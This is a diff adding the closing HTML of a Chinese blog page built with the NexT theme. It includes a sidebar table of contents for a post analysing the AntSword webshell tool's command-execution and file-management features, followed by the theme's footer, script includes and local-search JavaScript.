+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://gitee.com/ethustdout/pics/raw/master/uPic/head.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ethushiroha" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AntSword"><span class="nav-number">1.</span> <span class="nav-text">AntSword</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.</span> <span class="nav-text">虚拟终端 &#x2F; 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">初步分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fe"><span class="nav-number">1.1.2.</span> <span class="nav-text">fe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#runcmd"><span class="nav-number">1.1.3.</span> <span class="nav-text">runcmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#runshellshock"><span class="nav-number">1.1.4.</span> <span class="nav-text">runshellshock</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-shellshock"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">什么是 shellshock</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">如何使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COM"><span class="nav-number">1.1.5.</span> <span class="nav-text">COM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.6.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">文件管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.</span> <span class="nav-text">文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6-%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">创建文件&#x2F;写文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">打开文件&#x2F;读取文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">stdout</span>
+
+  
+</div>
+-->
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
